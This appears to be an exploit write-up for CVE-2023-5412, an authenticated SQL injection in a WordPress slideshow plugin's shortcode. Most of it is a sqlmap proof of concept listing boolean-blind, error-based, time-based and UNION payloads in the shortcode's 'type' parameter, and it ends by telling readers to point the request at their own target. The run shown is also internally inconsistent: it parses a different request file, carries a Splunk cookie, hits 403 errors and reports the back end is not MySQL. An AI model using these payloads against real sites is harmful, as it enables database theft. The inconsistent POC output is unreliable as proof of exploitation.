# CVE-2023-5412
Image horizontal reel scroll slideshow &lt;= 13.2 -  Authenticated (Subscriber+) SQL Injection via Shortcode

### Description:
The Image horizontal reel scroll slideshow plugin for WordPress is vulnerable to SQL Injection via the plugin's shortcode in versions up to, and including, 13.2 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for authenticated attackers with subscriber-level and above permissions to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.

```  
CVE ID: CVE-2023-5412
CVSS Score: 8.8
CVSS Metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Severity: high
Plugin Slug: image-horizontal-reel-scroll-slideshow

WPScan URL: https://www.wpscan.com/plugin/image-horizontal-reel-scroll-slideshow
Reference URL: https://www.wordfence.com/threat-intel/vulnerabilities/id/08fb698f-c87c-4200-85fe-3fe72745633e?source=api-prod
```

POC
---

```
$ python3 sqlmap.py -r request.txt --level 5 --risk 3 --dbms mysql
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7.10.4#dev}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:30:00 /2023-10-31/

[09:30:00] [INFO] parsing HTTP request from 'r.txt'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] y
JSON data found in POST body. Do you want to process it? [Y/n/q] y
Cookie parameter 'splunkweb_csrf_token_8000' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] n
[09:30:05] [INFO] testing connection to the target URL
[09:30:05] [WARNING] the web server responded with an HTTP error code (403) which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"id":15278,"title":"test","content":"<!-- wp:shortcode -->\n[ihrss-gallery type=\"GROUP1' AND 6149=6149-- rURz\" w=\"600\" h=\"170\" speed=\"1\" bgcolor=\"#FFFFFF\" gap=\"5\" random=\"YES\"]\n<!-- /wp:shortcode -->","status":"publish"}

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: {"id":15278,"title":"test","content":"<!-- wp:shortcode -->\n[ihrss-gallery type=\"GROUP1' AND GTID_SUBSET(CONCAT(0x7176707171,(SELECT (ELT(2634=2634,1))),0x717a6a6a71),2634)-- HfPe\" w=\"600\" h=\"170\" speed=\"1\" bgcolor=\"#FFFFFF\" gap=\"5\" random=\"YES\"]\n<!-- /wp:shortcode -->","status":"publish"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":15278,"title":"test","content":"<!-- wp:shortcode -->\n[ihrss-gallery type=\"GROUP1' AND (SELECT 9808 FROM (SELECT(SLEEP(5)))ZygG)-- lLMa\" w=\"600\" h=\"170\" speed=\"1\" bgcolor=\"#FFFFFF\" gap=\"5\" random=\"YES\"]\n<!-- /wp:shortcode -->","status":"publish"}

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: {"id":15278,"title":"test","content":"<!-- wp:shortcode -->\n[ihrss-gallery type=\"GROUP1' UNION ALL SELECT NULL,CONCAT(0x7176707171,0x584263726a5256524c4a78706c756a77726d4d626c754b4d654558734a4d6254664a4d4256565574,0x717a6a6a71),NULL,NULL-- -\" w=\"600\" h=\"170\" speed=\"1\" bgcolor=\"#FFFFFF\" gap=\"5\" random=\"YES\"]\n<!-- /wp:shortcode -->","status":"publish"}
---
[09:30:05] [INFO] testing MySQL
[09:30:05] [WARNING] the back-end DBMS is not MySQL
[09:30:05] [CRITICAL] sqlmap was not able to fingerprint the back-end database management system
[09:30:05] [WARNING] HTTP error codes detected during run:
403 (Forbidden) - 3 times

[*] ending @ 09:30:05 /2023-10-31/
```

### Info

Change the url and the cookies to match your target in request.txt and then run sqlmap like above.

